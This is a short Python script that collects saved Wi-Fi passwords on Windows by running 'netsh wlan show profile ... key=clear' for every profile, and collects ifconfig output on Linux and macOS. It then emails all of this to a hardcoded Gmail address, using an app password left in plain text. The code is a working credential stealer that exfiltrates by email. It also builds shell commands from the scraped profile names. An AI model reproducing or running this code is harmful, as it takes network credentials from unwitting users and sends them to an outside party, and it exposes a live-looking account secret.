import subprocess
import platform
import re
from temp_mail_generator import EmailSender

def send_mail(subject, body):
    sender_email = "testing.purposes1989@gmail.com"
    app_password = "ypcm vlyj zhok vuhl"  # Use your Gmail App password here
    email_sender = EmailSender(sender_email, app_password)

    receiver_email = "testing.purposes1989@gmail.com"
    # Call the method to send an email with attachments
    email_sender.send_email(receiver_email, subject, body)

def get_network_config():
    try:
        # Check the OS and use appropriate command for network config
        if platform.system() == "Windows":
            command = 'netsh wlan show profile'
            # Use regex to extract only the wi-fi network names
            networks = subprocess.check_output(command, shell=True)
            network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks.decode())  # Use raw string for regex

            # Get the password for each network
            result = ""
            for network_name in network_names_list:
                command = f'netsh wlan show profile name={network_name} key=clear'
                current_result = subprocess.check_output(command, shell=True)
                result += current_result.decode()  # Decode the result

        elif platform.system() == "Linux" or platform.system() == "Darwin":  # macOS:
            command = 'ifconfig'
            result = subprocess.check_output(command, shell=True).decode()  # Decode the result
        else:
            raise Exception("Unsupported OS")

        return result
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        return None

message = get_network_config()
if message:
    send_mail("Subject: Network config", message)
